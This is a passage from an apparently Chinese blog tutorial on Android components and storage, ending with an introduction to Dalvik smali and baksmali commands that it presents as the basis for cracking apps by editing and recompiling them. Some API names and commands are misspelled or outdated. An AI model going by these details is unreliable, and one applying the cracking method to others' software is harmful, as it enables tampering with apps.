title="3、onDestroy()"></a>3、onDestroy()</h4><p>这个方法在活动被销毁之前调用，之后活动的状态将变为销毁状态。</p><p>白化：手机向上一滑回到桌面 应用进行最小化 放在后台运行 那么 在向上一滑可以结束应用</p><h4 id="4、onRestart"><a href="#4、onRestart" class="headerlink" title="4、onRestart()"></a>4、onRestart()</h4><p>这个方法在活动由停止状态变为运行状态之前调用，也就是活动被重新启动了。</p><p>白化：应用关闭 进行重新启动</p><h2 id="二、Service-服务"><a href="#二、Service-服务" class="headerlink" title="二、Service(服务)"></a>二、Service(服务)</h2><h3 id="一般概念"><a href="#一般概念" class="headerlink" title="一般概念"></a>一般概念</h3><p>Android中的服务，它与Activity不同，它是不能与用户交互的，不能自己启动的，运行在后台的程序如果我们退出应用时，Service进程并没有结束，它仍然在后台运行</p><p>1、比如我们播放音乐的时候，有可能想边听音乐边干些其他事情，当我们退出播放音乐的应用，如果不用Service，我们就听不到歌了，所以这时便就得用到Service了</p><p>2、比如当我们一个应用的数据是通过网络获取的，不同时间（一段时间）的数据是不同的这时候我们可以用Service在后台定时更新，而不用每打开应用的时候在去获取。就像微信里面的语音一样!</p><h3 id="Service生命周期"><a href="#Service生命周期" class="headerlink" title="Service生命周期"></a>Service生命周期</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>Service的生命周期并不像Activity那么复杂，它只继承的是<code>onCreate()</code>、<code>onStart()</code>、<code>onDestroy()</code>三个方法</p><p>当我们第一次启动Service时，先后调用<code>onCreate()</code>和<code>onStart()</code>这两个方法，当停止Service时，则执行<code>onDestroy()</code>方法</p><p><strong>这里注意</strong>：如果Service已经启动了，当我们再次启动Service时，不会在执行onCreate()方法，而是直接执行onStart()方法。</p><h4 id="startservice启动Service的生命周期"><a href="#startservice启动Service的生命周期" class="headerlink" title="startservice启动Service的生命周期"></a>startservice启动Service的生命周期</h4><p>执行startservice时，Service会经历<code>onCreate -&gt; onStartcommand</code> (函数API)。</p><p>执行stopService时，Service直接调用onDestroy方法。</p><p>调用者如果没有stopService，Service会一直在后台运行，下次调用者再起来仍然可以stopService。</p><p>如果不去触发，就一直在后台运行</p><h4 id="bondservice启动Service的生命周期"><a href="#bondservice启动Service的生命周期" class="headerlink" title="bondservice启动Service的生命周期"></a>bondservice启动Service的生命周期</h4><p>执行bondservice时，Service会经历<code>onCreate -&gt; onBind</code></p><p>这个时候调用者和Service绑定在一起。</p><p>调用者调用<code>unbindService</code>方法或者调用者Context不存在了(如Activity被 finish了)，Service就会调用<code>onUnbind-&gt; onDestroy</code></p><p>这里所谓的绑定在一起就是说两者是共同存在和消失的</p><h4 id="图解"><a href="#图解" class="headerlink" title="图解"></a>图解</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115907.png" alt="image-20210717164453311"></p><h2 id="三、Broadcast-receiver-广播接收者"><a href="#三、Broadcast-receiver-广播接收者" class="headerlink" title="三、Broadcast receiver(广播接收者)"></a>三、Broadcast receiver(广播接收者)</h2><h4 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h4><p>Broadcast receiver：广播接收者，就是接收来自android内部的广播，对接收到的广播进行选择处理，想要接收什么样的广播和内部定义的广播匹配，匹配则进行该做的处理操作，没有匹配则无操作</p><p>比如在刷抖音的同时接收到短信事件，对此你要做什么操作，是想看短信内容还是不做什么处理继续刷抖音，这就是广播的用途, android内部的四大内置类之一：Broadcast receiver</p><h5 id="广播接收者的四大用途"><a href="#广播接收者的四大用途" class="headerlink" title="广播接收者的四大用途"></a>广播接收者的四大用途</h5><p>1、首先我们要有一个发送广播的按钮，对收到的广播进行处理</p><p>2、编写广播接收类Receiver，继承BroadcastReceiver</p><pre class="line-numbers language-none"><code class="language-none">public class Receiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { System.out.println("收到了"); }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：onReceive()方法是对接收匹配的广播的处理操作</p><p>#3、因BroadcastReceiver是android内置类就如Activity类一样需要在AndroidManifest.xml文件进行声明</p><pre class="line-numbers language-none"><code class="language-none">&lt;receiver android:name=".Receiver"&gt; &lt;intent-filter &gt; &lt;action android:name="android.intent.action.name"/&gt; &lt;/intent-filter&gt;&lt;/receiver&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其中action的name属性是自己定义的名字，想要匹配广播则发送的广播和此名称一致即可对其处理</p><p>4、main.xml代码</p><p>点击按钮设置intent的action需要和上面写的一致：<code>android.intent.action.name</code>则接收者就可接收到广播对其操作</p><p>注：sendBroadcast()是发送广播</p><pre class="line-numbers language-none"><code class="language-none">public class MainActivity extends Activity { private Button send; @Override public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); send=(Button) this.findViewById(R.id.send); send.setOnClickListener(new OnClickListener() {  public void onClick(View v) { Intent i=new Intent(); i.setAction("android.intent.action.name"); sendBroadcast(i); } }); } @Override public boolean onCreateOptionsMenu(Menu menu) { getMenuInflater().inflate(R.menu.activity_main, menu); return true; } }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么结果 自然就是输出文本：收到了</p><h4 id="2、Notification-状态栏通知"><a href="#2、Notification-状态栏通知" class="headerlink" title="2、Notification(状态栏通知)"></a>2、Notification(状态栏通知)</h4><h5 id="0x01、理解"><a href="#0x01、理解" class="headerlink" title="0x01、理解"></a>0x01、理解</h5><p>首先，发送一个状态栏通知必须用到两个类：<code>NotificationManager</code>、<code>Notification</code></p><p>NotificationManager：是状态栏通知的管理类，负责发通知、清除通知等。NotificationManager是一个系统 Service，必须通过 getSystemService()方法来获取。</p><p>Notifcation：是具体的状态栏通知对象，可以设置icon、文字、提示声音、振动等参数。</p><h5 id="0x02、使用"><a href="#0x02、使用" class="headerlink" title="0x02、使用"></a>0x02、使用</h5><h5 id="1、创建-Notification"><a href="#1、创建-Notification" class="headerlink" title="1、创建 Notification"></a>1、创建 Notification</h5><p>通过 NotificationManager的notify(int、Notification)方法来启动 Notifcation<br>第一个参数唯一的标识该 Notifcation，第二个参数就是 Notifcation对象。</p><h5 id="2、更新-Notification"><a href="#2、更新-Notification" class="headerlink" title="2、更新 Notification"></a>2、更新 Notification</h5><p>调用 Notification的 <code>setLatestEventInfo</code>方法来更新内容，然后再调用 NotifcationManager的 notify()方法</p><h5 id="3、删除-Notification"><a href="#3、删除-Notification" class="headerlink" title="3、删除 Notification"></a>3、删除 Notification</h5><p>通过 NotifcationManager的<code>cancel(int)</code>方法，来清除某个通知。其中参数就是 Notifcation的唯一标识D</p><p>当然也可以通过<code>cancelAll</code>(来清除状态栏所有的通知）</p><h5 id="4、Notification设置-振动、铃声等"><a href="#4、Notification设置-振动、铃声等" class="headerlink" title="4、Notification设置(振动、铃声等)"></a>4、Notification设置(振动、铃声等)</h5><h5 id="0x03、状态栏通知-Notification-参数的设置"><a href="#0x03、状态栏通知-Notification-参数的设置" class="headerlink" title="0x03、状态栏通知(Notification)参数的设置"></a>0x03、状态栏通知(Notification)参数的设置</h5><pre class="line-numbers language-none"><code class="language-none">//新建状态栏通知baseNF = new Notification();//设置通知在状态栏显示的图标baseNF.icon = R.drawable.icon; //通知时在状态栏显示的内容baseNF.tickerText = "You clicked BaseNF!"; //通知的默认参数  DEFAULT_SOUND, DEFAULT_VIBRATE, DEFAULT_LIGHTS//如果要全部采用默认值，用DEFAULT_ALL//采用默认声音 baseNF.defaults = Notification.DEFAULT_SOUND;//第二个参数：下拉状态栏时显示的消息标题 expanded message title//第三个参数：下拉状态栏时显示的消息内容 expanded message text //第四个参数：点击该通知时执行页面跳转 baseNF.setLatestEventInfo(Lesson_10.this, "Title01", "Content01", pd);//发出状态栏通知nm.notify(Notification_ID_BASE, baseNF); <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="0x04、PendingIntent"><a href="#0x04、PendingIntent" class="headerlink" title="0x04、PendingIntent"></a>0x04、PendingIntent</h5><h5 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h5><p>与Intent有些类似，它们之间也确实存在着不少共同点</p><p>相同：都可以去指明某一个“意图”，都可以用于启动活动、启动服务以及发送广播等。</p><p>不同：Intent更加倾向于去立即执行某个动作，而 PendingIntent更加倾向于在某个合适的时机去执行某个动作。</p><p>所以，也可以把PendingIntent 简单地理解为延迟执行的Intent。</p><h5 id="获取PendingIntent的实例"><a href="#获取PendingIntent的实例" class="headerlink" title="获取PendingIntent的实例"></a>获取PendingIntent的实例</h5><p>通过三个静态的方法︰</p><pre class="line-numbers language-none"><code class="language-none">getActivity()方法getBroadcast()方法getService()方法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="3、深入去理解"><a href="#3、深入去理解" class="headerlink" title="3、深入去理解"></a>3、深入去理解</h4><h5 id="0x01、广播接收者（Broadcast-receiver）的理解"><a href="#0x01、广播接收者（Broadcast-receiver）的理解" class="headerlink" title="0x01、广播接收者（Broadcast receiver）的理解"></a>0x01、广播接收者（Broadcast receiver）的理解</h5><p>我们的应用可以使用它对外部事件进行过滤只对感兴趣的外部事件(如当电话接入时，或者数据网络可用时)<br>进行接收并做出响应。广播接收器没有用户界面。然而，它们可以启动一个 activity或 service来响应它们收到的信息，或者用 NotificationManager来通知用户。通知可以用很多种方式来吸引用户的注意力闪动背灯、震动、播放声音等。一般来说是在状态栏上放一个持久的图标，用户可以打开它并获取消息。</p><h5 id="0x02、广播类型"><a href="#0x02、广播类型" class="headerlink" title="0x02、广播类型"></a>0x02、广播类型</h5><p>1、普通广播，通过<code>Context.sendBroadcast(Intentmylntent)</code>发送的。<br>2、有序广播，通过<code>Context.sendOrderedBroadcast(intent，receiverPermission)</code>发送的</p><p>该方法第2个参数决定该广播的级别，级别数值是在<code>-1000~1000</code>之间，值越大，发送的优先级越高；广播接收者接收广播时的级别级别，可通过<code>intentfilter</code>中的<code>priority</code>进行设置设为2147483647时优先级最高，同级別接收的先后是随机的，再到级别低的收到广播，高级别的或同级别先接收到广播的可以通过<code>aboutBrodcast()</code>方法截断广播使其他的接收者无法收到该广播，还有其他构造函数。</p><p>3、异步广播，</p><p>通过<code>Context.sendStickyBroadcast(Intent myIntent)</code>发送的，还有<code>sendStickyOrderedBroadcast(intent，resultReceiver，scheduler，initialCode，initialData，initialExtras)</code>方法，该方法具有有序广播的特性也有异步广播的特性；</p><p>发送异步广播要：权限，接收并处理完 Intent后，广播依然存在，直到你调用 removeStickyBroadcast(intent)主动把它去掉</p><p><strong>注意</strong>：发送广播时的intent参数与<code>Contex.startActivity</code>启动起来的 Intent不同前者可以被多个订阅它的广播接收器调用，后者只能被一个<code>(Activity或 service)</code>调用。</p><h5 id="3、监听广播-Intent步骤："><a href="#3、监听广播-Intent步骤：" class="headerlink" title="3、监听广播 Intent步骤："></a>3、监听广播 Intent步骤：</h5><p>写一个继承 BroadCastReceiver的类重写<code>onReceive()</code>方法，广播接收器仅在它执行这个方法时处于活跃状态。</p><p>当 onReceive()返回后，它即为失活状态，注意为了保证用户交互过程的流畅，一些费时的操作要放到线程里</p><p>如类名<code>SMSBroadcastReceiver</code></p><p>注册该广播接收者，注册有两种方法程序动态注册和Androidmanifest文件中进行静态注册</p><p>1、静态注册的广播，下面的 priority表示接收广播的级别”2147483647”为最高优先级</p><p>2、动态注册，一般在 Activity可交互时<code>onResume()</code>内注册BroadcastReceiver</p><pre class="line-numbers language-none"><code class="language-none">IntentFilter intentFilter=new IntentFilter("android.provider.Telephony.SMS_RECEIVED");registerReceiver(mBatteryInfoReceiver ,intentFilter);//取消注册unregisterReceiver(receiver);&lt;!-- 检测网络的权限 --&gt;&lt;uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4、注意事项"><a href="#4、注意事项" class="headerlink" title="4、注意事项"></a>4、注意事项</h4><h5 id="1、生命周期只有十秒左右"><a href="#1、生命周期只有十秒左右" class="headerlink" title="1、生命周期只有十秒左右"></a>1、生命周期只有十秒左右</h5><p>如果在<code>onreceive()</code>内做超过十秒内的事情，就会报<code>ANR(Application no Response)</code>程序无响应的错误信息</p><p>如果需要完成一项比较耗时的工作，应该通过发送Intent给Service，由 Service来完成。</p><p>这里不能使用子线程来解决，因为 BroadcastReceiver的生命周期很短，子线程可能还没有结束 BroadcastReceiver就先结束了<code>.BroadcastReceiver</code>一旦结束，此时BroadcastReceiver的所在进程很容易在系统需要内存时被优先杀死，因为它属于空进程（没有任何活动组件的进程）。如果它的宿主进程被杀死，那么正在工作的子线程也会被杀死。所以采用子线程来解决是不可靠的。</p><h5 id="2、动态注册广播接收器的其他特点"><a href="#2、动态注册广播接收器的其他特点" class="headerlink" title="2、动态注册广播接收器的其他特点"></a>2、动态注册广播接收器的其他特点</h5><p>当用来注册的 Activity关掉后，广播也就失效了。静态注册无需担忧广播接收器是否被关闭，只要设备是开启状态，广播接收器也是打开着的。也就是说哪怕APP本身未启动，该APP订阅的广播在触发时也会对它起作用系统常见广播 Intent</p><p>如开机启动、电池电量变化、时间的变化等广播。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>手机每天很多推送，推送就是广播接收者，怎么将信息推送岀来，就是以上阐述内容</p><h2 id="四、内容提供者-Content-provider"><a href="#四、内容提供者-Content-provider" class="headerlink" title="四、内容提供者(Content provider)"></a>四、内容提供者(Content provider)</h2><h2 id="1、Content-Providers的概念"><a href="#1、Content-Providers的概念" class="headerlink" title="1、Content Providers的概念"></a>1、Content Providers的概念</h2><p>内容提供器(Content provider)主要用于在不同的应用程序之间实现数据共享的功能，它提供了一套完整的机制，允许一个程序访问另一个程序中的数据，同时还能保证被访数据的安全性。目前，使用内容提供器是 Android实现跨程序共享数据的标准方式。不同于文件存储和 SharedPreferences存储中的两种全局可读写操作模式，内容提供器可以选择只对哪一部分数据进行共享，从而保证我们程序中的隐私数据不会有泄漏的风险。</p><h2 id="2、Content-Providers的两种方法"><a href="#2、Content-Providers的两种方法" class="headerlink" title="2、Content Providers的两种方法"></a>2、Content Providers的两种方法</h2><p>1）使用现有的内容提供器来读取和操作相应程序中的数据；<br>2）创建自己的内容提供器给我们程序的数据提供外部访问接口。</p><h2 id="3、访问其他程序中的数据"><a href="#3、访问其他程序中的数据" class="headerlink" title="3、访问其他程序中的数据"></a>3、访问其他程序中的数据</h2><p>当一个应用程序通过内容提供器对其数据提供了外部访问接口，任何其他的应用程序就都可以对这部分数据进行访问。Android系统中自带的电话簿、短信、媒体库等程序都提供了类似的访问接口。</p><h3 id="1、ContentResolver的使用"><a href="#1、ContentResolver的使用" class="headerlink" title="1、ContentResolver的使用"></a>1、ContentResolver的使用</h3><h4 id="0x01、前言"><a href="#0x01、前言" class="headerlink" title="0x01、前言"></a>0x01、前言</h4><p>如果想要访问內容提供器中共享的数据，就一定要写<code>ContentResolver</code>类，可以通过Context中的getContentResolver方法获取到该类的实例。</p><h4 id="0x02、ContentResolver"><a href="#0x02、ContentResolver" class="headerlink" title="0x02、ContentResolver"></a>0x02、ContentResolver</h4><p>提供了一系列的方法用于对数据进行CRUD操作，其中 insert(方法用于添加数据，update方法用于更新数据，delete方法用于删除数据，query方法用于查询数据)。</p><p>但不同于SQLiteDatabase，ContentResolver中的增删改查方法都是不接收表名参数的，而是使用一个Uri参数代替，这个参数被称为内容URI.</p><h4 id="0x03、UrI的理解"><a href="#0x03、UrI的理解" class="headerlink" title="0x03、UrI的理解"></a>0x03、UrI的理解</h4><p>内容URI给內容提供器中的数据建立了唯一标识符，它主要由两部分组成，<code>权限(authority)和路径(path)</code>。</p><p>权限是用于对不同的应用程序做区分的，一般为了避免冲突，都会采用程序包名的方式来进行命名。</p><p>路径则是用于对同一应用程序中不同的表做区分的，通常都会添加到权限的后面。</p><pre class="line-numbers language-none"><code class="language-none">第一部分：content://相当于http://第二部分：com.eyy5.app.provider相当于vip.qiyikt.com第三部分：table1相当于forum<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="0x04、查询"><a href="#0x04、查询" class="headerlink" title="0x04、查询"></a>0x04、查询</h4><pre class="line-numbers language-none"><code class="language-none">uri：指定查询某个应用程序下的某一张表projection：指定查询的列名selection：指定 where的约束条件selectionArgs：为 where中的占位符提供具体的值sortOrder：指定查询结果的排序方式Cursor cursor = getContentResolver().query(uri,projection,selection,selectionArgs,sortOrder);if (cursor != null) {while (cursor.moveToNext()) {String column1 = cursor.getString(cursor.getColumnIndex("column1"));int column2 = cursor.getInt(cursor.getColumnIndex("column2"));}cursor.close();}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="0x05、添加"><a href="#0x05、添加" class="headerlink" title="0x05、添加"></a>0x05、添加</h4><pre class="line-numbers language-none"><code class="language-none">ContentValues values = new ContentValues();values.put("column1", "text");values.put("column2", 1);getContentResolver().insert(uri, values);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="0x06、修改"><a href="#0x06、修改" class="headerlink" title="0x06、修改"></a>0x06、修改</h4><pre class="line-numbers language-none"><code class="language-none">ContentValues values = new ContentValues();values.put("column1", "");getContentResolver().update(uri, values, "column1 = ? and column2 = ?", new String[] {"text", "1"});<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="0x07、删除"><a href="#0x07、删除" class="headerlink" title="0x07、删除"></a>0x07、删除</h4><pre class="line-numbers language-none"><code class="language-none">getContentResolver().delete(uri, "column2 = ?", new String[] { "1" });<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2、使用-SharedPreferences存储数据"><a href="#2、使用-SharedPreferences存储数据" class="headerlink" title="2、使用 SharedPreferences存储数据"></a>2、使用 SharedPreferences存储数据</h3><p>Shared Preferences的概念<br>保存基于XML文件存储的key-value键值对数据，通常用来存储一些简单的配置信息。通过DDMs的File Explorer面板，展开文件浏览树，很明显 SharedPreferences数据总是存储在/data/data/shared_prefs目录下。SharedPreferences对象本身只能获取数据而不支持存储和修改，存储修改是通过<code>SharedPreferences.edit()</code>获取的内部接口 Editor对象实现。</p><h3 id="3、文件存储方式"><a href="#3、文件存储方式" class="headerlink" title="3、文件存储方式"></a>3、文件存储方式</h3><h4 id="文件存储数据的概念cookie"><a href="#文件存储数据的概念cookie" class="headerlink" title="文件存储数据的概念cookie"></a>文件存储数据的概念cookie</h4><p>文件存储是 Android中最基本的一种数据存储方式，它不对存储的内容进行任何的格式化处理，所有数据都是原封不动地保存到文件当中的，因而它比较适合用于存储一些简单的文本数据或二进制数据。如果你想使用文件存储的方式来保存一些较为复杂的文本数据，就需要定义一套自己的格式规范，这样方便于之后将数据从文件中重新解析出来。</p><h4 id="文件存储数据的实现步骤"><a href="#文件存储数据的实现步骤" class="headerlink" title="文件存储数据的实现步骤"></a>文件存储数据的实现步骤</h4><p>Context类中提供了一个<code>openFileOutput()</code>方法，可以用于将数据存储到指定的文件中。这个方法接收两个参数，第一个参数是文件名，在文件创建的时候使用的就是这个名称</p><p>注意这里指定的文件名不可以包含路径，因为所有的文件都是默认存储到<code>/data/data/files/</code>目录下的</p><p>第二个参数是文件的操作模式，主要有两种模式可选，MODE_PRIVATE和MODE_APPEND</p><p>其中MODE_PRIVATE是默认的操作模式，表示当指定同样文件名的时候，所写入的内容将会覆盖原文件中的内容，而MODE_APPEND则表示如果该文件已存在就往文件里面追加内容，不存在就创建新文件。其实文件的操作模式本来还有另外两种，MODE_WORLD_READABLE和 MODE_WORLD_WRITEABLE，这两种模式表示允许其他的应用程序对我们程序中的文件进行读写操作，不过由于这两种模式过于危险，很容易引起应用的安全性漏洞，现已在 Android4.2版本中被废弃</p><p><strong>Context还提供了如下几个重要的方法</strong></p><pre class="line-numbers language-none"><code class="language-none">getDir(String name҅int mode):在应用程序的数据文件夹下获取或者创建name对应的子目录File getFilesDir():获取该应用程序的数据文件夹的绝对路径String[] fileList():返回该应用数据文件夹的全部文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="4、SQLite存储数据"><a href="#4、SQLite存储数据" class="headerlink" title="4、SQLite存储数据"></a>4、SQLite存储数据</h2><h3 id="1、SQLite数据库的概念"><a href="#1、SQLite数据库的概念" class="headerlink" title="1、SQLite数据库的概念"></a>1、SQLite数据库的概念</h3><p>SQLite是一款轻量级的关系型数据库，它的运算速度非常快，占用资源很少，通常只需要几百K的內存就足够了</p><p>因而特别适合在移动设备上使用。SQLite不仅支持标准的SQL语法，还遵循了数据库的ACID事务，而SQLite又比一般的数据库要简单得多，它甚至不用设置用户名和密码就可以使用。Android正是把这个功能极为强大的数据库嵌入到了系统当中，使得本地持久化的功能有了一次质的飞跃。</p><h3 id="2、如何创建数据库"><a href="#2、如何创建数据库" class="headerlink" title="2、如何创建数据库"></a>2、如何创建数据库</h3><p>Android为了让我们能够更加方便地管理数据库，专门提供了一个SQLiteOpenHelper帮助类，借助这类就可以非常简单地对数据库进行创建和升级。<br>注意<br>SQLiteOpenHelper是一个抽象类，这意味着如果我们想要使用它的话，就需要创建一个帮助类去继承SQLiteOpenHelper</p><p>SQLiteOpenHelper中有两个抽象方法，分别是<code>onCreate()</code>和 <code>onUpgrade()</code></p><p>我们必须在自己的帮助类里面重写这两个方法，然后分别在这两个方法中去实现创建、升级数据库的逻辑。</p><h3 id="SQLiteOpenHelper的构造方法"><a href="#SQLiteOpenHelper的构造方法" class="headerlink" title="SQLiteOpenHelper的构造方法"></a>SQLiteOpenHelper的构造方法</h3><pre class="line-numbers language-none"><code class="language-none">//context：上下文对象//name：数据库名，创建数据库时使用的就是这里指定的名称//factory：允许我们在查询数据的时候返回一个自定义的 Cursor，一般都是传入null/version：当前数据库的版本号，可用于对数据库进行升级操作<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">public MyDatabaseHelper(Context context, String name,CursorFactory factory, int version) { super(context, name, factory, version);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5、网络数据存储"><a href="#5、网络数据存储" class="headerlink" title="5、网络数据存储"></a>5、网络数据存储</h2><h3 id="使用HTTP协议访问网络"><a href="#使用HTTP协议访问网络" class="headerlink" title="使用HTTP协议访问网络"></a>使用HTTP协议访问网络</h3><p>工作原理：就是客户端向服务器发出一条HTTP请求，服务器收到请求之后会返回一些数据给客户端，然后客户端再对这些数<br>据进行解析和处理就可以了。<br>1）使用 HttpURLConnection</p><p>常用的方法主要有两个，GET和POST。GET表示希望从服务器那里获取数据，而POST则表示希望提交数据给服务器。</p><pre class="line-numbers language-none"><code class="language-none">//GETconn.setRequestMethod("GET");//POSTconn.setRequestMethod("POST");//连接超时conn.setConnectTimeout(8000);//读取超时conn.setReadTimeout(8000);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="HttpClient"><a href="#HttpClient" class="headerlink" title="HttpClient"></a>HttpClient</h3><p>HttpClient是Apache提供的HTTP网络访问接口，从一开始的时候就被引入到了AndroidAPI中。<br>HttpClient是一个接口，因此无法创建它的实例，通常情况下都会创建一个DefaultHttpClient的实例</p><pre class="line-numbers language-none"><code class="language-none">HttpClient httpClient = new DefaultHttpClient();GET请求：HttpGet httpGet = new HttpGet("http://www.baidu.com");httpClient.execute(httpGet);POST请求：HttpPost httpPost = new HttpPost("http://www.baidu.com");List&lt;NameValuePair&gt; params = new ArrayList&lt;NameValuePair&gt;();params.add(new BasicNameValuePair("username", "admin"));params.add(new BasicNameValuePair("password", "123456"));UrlEncodedFormEntity entity = new UrlEncodedFormEntity(params, "utf-8");httpPost.setEntity(entity);httpClient.execute(httpPost);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Dalvik字节码"><a href="#Dalvik字节码" class="headerlink" title="Dalvik字节码"></a>Dalvik字节码</h1><h2 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h2><p>Dalvik就是smail代码一种编写形式，在Java代码里面不能去修改某个逻辑，那么<strong>把java代码编译成smail代码，就是把dex文件转换为smail文件</strong>，也就说Java和 smali进行了一个翻译，那么记住 Dalvik里面的smail是可以修改的，java代码是修改不了的</p><p><strong>破解的原理：就是把Java改成smail，用smail去修改之后在回编译回去同时java逻辑也发生的改变</strong></p><h2 id="1、dalvik寄存器"><a href="#1、dalvik寄存器" class="headerlink" title="1、dalvik寄存器"></a>1、dalvik寄存器</h2><p><strong>32位</strong>，支持所有类型，&lt;=32的一个寄存器</p><p>这个时候 我们要考虑一个问题</p><p>如果寄存器里面的东西超过32位怎么办？</p><p>使用32位两个相邻的寄存器就是64位，所以64位就是两个相邻的寄存器</p><h2 id="2、寄存器的命名法"><a href="#2、寄存器的命名法" class="headerlink" title="2、寄存器的命名法"></a>2、寄存器的命名法</h2><pre class="line-numbers language-none"><code class="language-none">v命名法：局部变量寄存器v0-vn参数寄存器vn-vn+m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">p命名法参数寄存器p0-pn变量寄存器v0-vn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>smail代码 看不懂 可以转换看Java代码</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115908.png" alt="image-20210720102844674"></p><h2 id="简单分析一下"><a href="#简单分析一下" class="headerlink" title="简单分析一下"></a>简单分析一下</h2><h3 id="v命名"><a href="#v命名" class="headerlink" title="v命名"></a>v命名</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115909.png" alt="image-20210720103924865"></p><p>分析：</p><p>这个demo里面有一个 getHelloworld一个方法，括号里面传的是参数javalangstring就是参数 </p><p><code>L</code>是JAVA中的java类型，对应Dalvik字节码类型就是<code>L</code></p><p><code>I</code>是JAVA中的int类型，对应Dalvik字节码类型就是<code>I</code></p><p><code>;</code>是隔开两个参数，返回值类型就是 string </p><p>regsize表示寄存器有5个</p><p>此时看到的是调用方法，v0~v4</p><p>第一个红框调用了一个方法把V2、V3存了进去，返回了一个v2，v2和v3是<strong>变量寄存器</strong>返回了v2，v2包含v3</p><p>第二个红框v0和v4做一个<strong>参数寄存器</strong>返回了v0，那么3是什么？v3在这里已经开始被v2返回掉了</p><p>注：<code>invoke-virtual</code>是调用一个虚方法一个直接方法的意思</p><h3 id="p命名"><a href="#p命名" class="headerlink" title="p命名"></a>p命名</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210720115910.png" alt="image-20210720104313827"></p><p>分析：</p><p>这个demo同样是 getHelloworld方法</p><p>第一个红框在<code>java/lang/StringBuilder</code>类里面调用了一个 append的方法拼接传来string，然后返回了一个java/lang/StringBuilder类型，把p0传了进去，p0前面看是参数，这里就是把p0作为参数传了进去调用了v1，就是v1里面传入了个p0，然后在返回一个 javalangstring，最后返回了v1，v1本来是存在的但他传入了个p0，但是他还是v1，返回了<code>move object</code>对象！所以他返回了个v0，所以这里<strong>v0作为参数寄存器</strong></p><p>第二个红框中，p1这时候作为一个参数继续传给v0，继续最终返回v0，所以这样就可以理解了p0和p1为参数寄存器</p><h2 id="3、dex文件反汇编工具"><a href="#3、dex文件反汇编工具" class="headerlink" title="3、dex文件反汇编工具"></a>3、dex文件反汇编工具</h2><h3 id="0x01、-java编译成-class在编译成-dex，最后反编译得到samli文件"><a href="#0x01、-java编译成-class在编译成-dex，最后反编译得到samli文件" class="headerlink" title="0x01、.java编译成.class在编译成.dex，最后反编译得到samli文件"></a>0x01、<code>.java</code>编译成<code>.class</code>在编译成<code>.dex</code>，最后反编译得到samli文件</h3><pre class="line-numbers language-none"><code class="language-none">.java ! .class ! .dex ! smali<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x02、dx-jar：-class打包-dex"><a href="#0x02、dx-jar：-class打包-dex" class="headerlink" title="0x02、dx.jar：.class打包.dex "></a>0x02、<code>dx.jar</code>：<code>.class</code>打包<code>.dex </code></h3><pre class="line-numbers language-none"><code class="language-none">dx --dex --output=Decrypt.dex com/yijinda/demo/Decrypt.cl ass<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用dex将指定目录下的 class打包成dex</p><h3 id="0x03、Baksmali-jar：-dex反汇编成smali-反编译"><a href="#0x03、Baksmali-jar：-dex反汇编成smali-反编译" class="headerlink" title="0x03、Baksmali.jar：.dex反汇编成smali(反编译)"></a>0x03、Baksmali.jar：<code>.dex</code>反汇编成smali(反编译)</h3><pre class="line-numbers language-none"><code class="language-none">java -jar baksmali.jar -o smali_out/ classes.dex<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x04、Smali-jar：-smali打包成-dex-回编译"><a href="#0x04、Smali-jar：-smali打包成-dex-回编译" class="headerlink" 